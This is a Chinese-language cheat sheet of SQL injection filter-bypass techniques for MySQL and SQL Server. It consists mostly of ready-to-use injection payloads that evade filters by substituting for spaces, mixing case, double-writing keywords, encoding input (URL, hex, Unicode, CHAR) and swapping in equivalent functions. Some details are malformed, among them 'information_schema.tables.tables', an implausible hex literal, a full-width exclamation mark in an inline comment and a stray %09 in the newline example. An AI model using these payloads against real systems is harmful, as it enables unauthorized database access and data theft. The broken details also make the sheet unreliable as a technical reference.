# SQL注入绕过

## 空格过滤绕过
1. `/**/` 绕过
MySQL 数据库可以使用`/**/`(注释符)来代替空格
`?id=1/**/and/**/1=2/**/union/**/select/**/1,2,database()`

2. 制表符绕过
MySQL 数据库可以使用制表符来代替空格，在URL中传输需要编码，其编码为`%09`
`?id=1%09and%091=2%09union%09select%091,2,database()`

3. MySQL 数据库可以使用换行符来代替空格，在URL中传输需要编码，其编码为`%0a`
`?id=1%0aand%091=2%0aunion%0aselect%0a1,2,database()`

4. 括号绕过
MySQL数据库有个特性。在条件语句中，在 where id = 1 后面加 “=1”，成为where id=1=1 就是与原来结果一样；在后面加 “=0”，成为where id=1=0 就是与原来结果反选（取反）。
利用这个特性，构造括号绕过playload就可以进行 bool 注入
`id=1=(ascii(mid(database()from(1)for(1)))=99)`
`id=1=(ascii(mid(database()from(1)for(1)))=100)`

5. \`绕过
MySQL中的反引号 (\`) 是为了区分MySQL保留字与普通字符而引入的符号，反引号可以代替空格
`` select`username`from`user`where`username`='user1' ``

## 特殊字符过滤绕过
1. 内陆注释绕过
MySQL会执行放在/! ···/中的语句。/! 50010···/也可以执行位于其中的SQL语句，其中50010表示5.00.10，为MySQL版本号。当MySQL实际版本大于或等于注释中的版本号时，就会执行注释中的代码。可以利用这么特性逃过特殊字符过滤
`` /*！select*/ * /*!from*/ user``

2. 大小写绕过
`id=1 and 1=2 union seLeCt 1,2,database()`

3. 双写关键字绕过
`id=1 and 1=2 union seselectlect 1,2,database()`

4. 双重URL编码绕过
`id=1 and 1=2 union se%256cect 1,2,database()`

5. 十六进制编码绕过（参数过滤）
MySQL数据库可以识别十六进制，如果PHP开启了GPC，GPC会自动对单引号进行转义，这样注入无法正常使用。但是参数转换为十六进制就不需要单引号
`` id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables.tables where table_name=0x43853739947``

6. Unicode 编码绕过
IIS中间件可以识别Unicode字符，会自动转换
`` id=1 and 0 < (se%u006cect top 1 name from sec.db.sysobjects where xtype='U')``

7. ASCII编码绕过
SQL Server数据库的char函数可以将字符转换为ASCII码，这样也可以绕过单引号过滤
``?id=1 and 0 < (select top 1 name from sec.dbo.sysobjects where xtype = 'U' and name not in (CHAR(101)%2bCHAR(105)%2bCHAR(115)))``

## 等价函数字符替换绕过
1. 用 like 或 in 替换 =
`` php?id=1 and 1 like 1``

2. 逗号过滤
``select substr(database(),1,1);`` 
替换：
``select substr(database() from 1 for 1);``
3. 等价函数
sleep函数可以使用benchmark替换；
ascii函数可以使用hex、bin、ord函数替换；
group_concat函数可以用concat_ws函数替换；
updatexml可以使用extractvalue函数替换。




